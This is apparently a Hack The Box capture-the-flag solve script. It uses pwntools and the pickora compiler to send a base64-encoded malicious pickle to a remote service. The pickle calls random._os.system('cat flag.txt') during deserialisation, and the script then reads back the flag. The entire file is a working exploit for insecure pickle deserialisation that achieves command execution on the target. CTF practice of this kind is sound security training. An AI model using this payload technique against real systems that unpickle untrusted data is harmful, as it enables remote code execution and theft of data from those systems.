from base64 import b64encode
from pickora import Compiler
from pwn import *

def send_payload(payload):
    payload = b64encode(compiler.compile(payload))
    io.recvuntil(b'> ')
    io.sendline(b'2')
    io.recvuntil(b': ')
    io.sendline(payload)

def get_flag():
    io.recvuntil(b'> ')
    io.sendline(b'1')
    io.recvuntil(b'HTB{')
    flag = io.recvuntil(b'}')
    return b'HTB{' + flag

def pwn():
    send_payload(b"GLOBAL('app', 'random._os.system')('cat flag.txt')")
    flag = get_flag()
    print(flag)

if __name__ == '__main__':
    ip = 'VICTIM_HOSTNAME'
    port = 1337
    io = remote(ip, port)
    #io = process(['python', 'app.py'])
    compiler = Compiler()
    pwn()
